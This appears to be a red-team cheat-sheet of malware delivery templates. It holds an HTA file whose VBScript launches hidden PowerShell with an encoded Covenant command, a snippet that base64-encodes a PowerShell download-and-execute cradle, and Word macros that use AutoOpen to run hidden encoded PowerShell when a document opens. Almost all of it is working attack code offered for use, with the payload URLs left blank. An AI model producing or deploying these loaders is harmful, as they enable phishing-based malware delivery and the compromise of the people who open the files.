#HTA FILES
<script language="VBScript">
  Function DoStuff()
    Dim wsh
    Set wsh = CreateObject("Wscript.Shell")
    wsh.run "powershell -Sta -Nop -Window Hidden -EncodedCommand PowerShellCovenant"
    Set wsh = Nothing
  End Function

  DoStuff
  self.close
</script>

#Encoded Base64

PS > $str = "IEX ((new-object net.webclient).downloadstring('http://'))"
PS > [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

#MACRO
Sub DoStuff()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run ""
    Set wsh = Nothing
End Sub

Sub AutoOpen()
    DoStuff
End Sub

Sub DoStuff()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell -Sta -Nop -Window Hidden -EncodedCommand "
    Set wsh = Nothing
End Sub

Sub AutoOpen()
    DoStuff
End Sub

 $str = "IEX ((new-object net.webclient).downloadstring('http://'))"
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

